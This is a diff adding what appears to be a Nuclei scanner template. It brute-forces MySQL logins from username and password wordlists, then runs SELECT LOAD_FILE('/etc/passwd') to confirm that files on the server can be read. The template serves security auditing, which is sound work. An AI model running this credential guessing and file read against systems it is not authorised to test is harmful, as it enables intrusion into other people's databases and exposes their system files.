@@ -1,0 +1,51 @@
+id: mysql-load-file
+info:
+  name: MySQL LOAD_FILE - Enable
+  author: pussycat0x
+  severity: high
+  description: |
+    The LOAD_FILE function in MySQL is potentially dangerous if not used carefully, as it can pose security risks. The function is designed to read the contents of a file on the server and return the file contents as a string. However, it can be exploited if not properly restricted or sanitized, leading to security vulnerabilities.
+  reference:
+    - https://nmap.org/nsedoc/scripts/mysql-databases.html
+  metadata:
+    shodan-query: port:3306
+    verified: true
+  tags: js,mysql,network,audit,fuzz
+
+javascript:
+  - code: |
+      let m = require('nuclei/mysql');
+      let c = m.MySQLClient();
+      let response = c.ExecuteQuery(Host,Port,User,Pass,Query);
+      to_json(response);
+
+    args:
+      Host: "{{Host}}"
+      Port: "3306"
+      Query: SELECT LOAD_FILE('/etc/passwd')
+      User: "{{usernames}}"
+      Pass: "{{passwords}}"
+
+    threads: 10
+    attack: pitchfork
+
+    payloads:
+      usernames: helpers/wordlists/mysql-users.txt
+      passwords: helpers/wordlists/mysql-passwords.txt
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - success == true
+
+      - type: word
+        words:
+          - "root:x:"
+
+    extractors:
+      - type: json
+        part: response
+        json:
+          - .Rows[]
